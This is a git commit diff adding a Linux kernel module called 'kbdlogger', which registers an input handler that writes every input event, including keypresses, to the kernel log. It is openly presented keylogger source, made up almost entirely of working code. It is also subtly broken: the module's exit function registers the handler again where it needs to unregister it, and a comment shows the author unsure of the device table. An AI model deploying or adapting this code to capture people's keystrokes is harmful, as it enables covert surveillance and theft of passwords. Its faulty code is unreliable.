007c0fad27321539da3cfd333811aa117035e66f
Rafael do Nascimento Pereira <rnp@25ghz.net>
2014-03-27 16:52:13 +0100

    Added input event loggin code
    Change-Id: I73b70030caaee88a940404b92d090b72e0fa7b31

--- kbdlogger/kbdlogger.c
+++ kbdlogger/kbdlogger.c
@@ -13,9 +13,11 @@
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
  *
- * Keylogger driver
+ * Keylogger driver - capture keypress events
  *
  */
+
+#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
 
 #include <linux/init.h>
 #include <linux/module.h>
@@ -27,15 +29,83 @@ MODULE_AUTHOR("Rafael do Nascimento Pereira <rnp@25ghz.net>");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Input driver keyboard logger");
 
+static int kbdlogger_connect(struct input_handler *handler, struct input_dev *dev,
+		const struct input_device_id *id)
+{
+	struct input_handle *handle;
+	int error;
+
+	handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
+	if (!handle)
+		return -ENOMEM;
+
+	handle->dev = dev;
+	handle->handler = handler;
+	handle->name = "evbug";
+	error = input_register_handle(handle);
+
+	if (error)
+		goto err_free_handle;
+
+	error = input_open_device(handle);
+	if (error)
+		goto err_unregister_handle;
+
+	printk(KERN_DEBUG pr_fmt("Connected device: %s (%s at %s)\n"),
+	       dev_name(&dev->dev),
+	       dev->name ?: "unknown",
+	       dev->phys ?: "unknown");
+
+	return 0;
+
+ err_unregister_handle:
+	input_unregister_handle(handle);
+ err_free_handle:
+	kfree(handle);
+	return error;
+}
+
+static void kbdlogger_event(struct input_handle *handle, unsigned int type,
+			unsigned int code, int value)
+{
+	printk(KERN_DEBUG pr_fmt("Keyboard event. Dev: %s, Type: %d, Code: %d, Value: %d\n"),
+	       dev_name(&handle->dev->dev), type, code, value);
+}
+
+
+static void kbdlogger_disconnect(struct input_handle *handle)
+{
+	printk(KERN_DEBUG pr_fmt("Disconnected device: %s\n"),
+	       dev_name(&handle->dev->dev));
+
+	input_close_device(handle);
+	input_unregister_handle(handle);
+	kfree(handle);
+}
+
+static const struct input_device_id kbdlogger_ids[] = {
+	{.driver_info = 1 },  /* driver_info = 1 ??  */
+	{},
+};
+
+MODULE_DEVICE_TABLE(input, kbdlogger_ids);
+
+static struct input_handler kbdlogger_handler = {
+	.connect    = kbdlogger_connect,
+	.disconnect = kbdlogger_disconnect,
+	.event      = kbdlogger_event,
+	.id_table   = kbdlogger_ids,
+	.name       = "kbdlogger",
+};
 
 static int __init kbdlogger_init(void)
 {
-	return 0;
+	return input_register_handler(&kbdlogger_handler);
 }
 
 static void __exit kbdlogger_exit(void)
 {
-
+	input_register_handler(&kbdlogger_handler);
 }
 
 module_init(kbdlogger_init);
